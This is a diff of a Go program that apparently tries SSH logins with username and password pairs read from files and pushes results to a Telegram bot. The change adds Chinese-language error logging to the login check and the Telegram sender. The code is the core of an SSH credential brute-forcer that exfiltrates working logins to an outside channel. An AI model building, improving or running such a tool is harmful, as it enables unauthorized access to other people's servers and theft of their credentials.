@@ -84,29 +84,41 @@ func trySSH(ip, username, password string) bool {
 
 	conn, err := ssh.Dial("tcp", ip+":22", config)
 	if err != nil {
+		fmt.Printf("❌ SSH Dial 失败 [%s %s %s]: %v\n", ip, username, password, err)
 		return false
 	}
 	defer conn.Close()
 
 	session, err := conn.NewSession()
 	if err != nil {
+		fmt.Printf("❌ 新建 SSH Session 失败 [%s %s %s]: %v\n", ip, username, password, err)
 		return false
 	}
 	defer session.Close()
 
 	output, err := session.Output("echo success")
 	if err != nil {
+		fmt.Printf("❌ 执行命令失败 [%s %s %s]: %v\n", ip, username, password, err)
 		return false
 	}
 
-	return strings.TrimSpace(string(output)) == "success"
+	if strings.TrimSpace(string(output)) == "success" {
+		return true
+	} else {
+		fmt.Printf("⚠️ 登录成功但输出非预期 [%s %s %s]: %s\n", ip, username, password, string(output))
+		return false
+	}
 }
 
 func sendTelegramMessage(message string) {
 	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", telegramBotToken)
 	body := fmt.Sprintf("chat_id=%s&text=%s", telegramChatID, message)
 
-	req, _ := http.NewRequest("POST", url, bytes.NewBufferString(body))
+	req, err := http.NewRequest("POST", url, bytes.NewBufferString(body))
+	if err != nil {
+		fmt.Printf("❌ 创建请求失败: %v\n", err)
+		return
+	}
 	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 
 	resp, err := http.DefaultClient.Do(req)
@@ -115,7 +127,16 @@ func sendTelegramMessage(message string) {
 		return
 	}
 	defer resp.Body.Close()
-	io.Copy(io.Discard, resp.Body)
+
+	if resp.StatusCode != http.StatusOK {
+		fmt.Printf("❌ Telegram 返回非200状态: %s\n", resp.Status)
+		respBody, _ := io.ReadAll(resp.Body)
+		fmt.Printf("🔍 返回内容: %s\n", string(respBody))
+	} else {
+		// 可选：调试成功推送
+		// fmt.Println("✅ Telegram 推送成功")
+		io.Copy(io.Discard, resp.Body)
+	}
 }
 
 func readLines(filename string) []string {
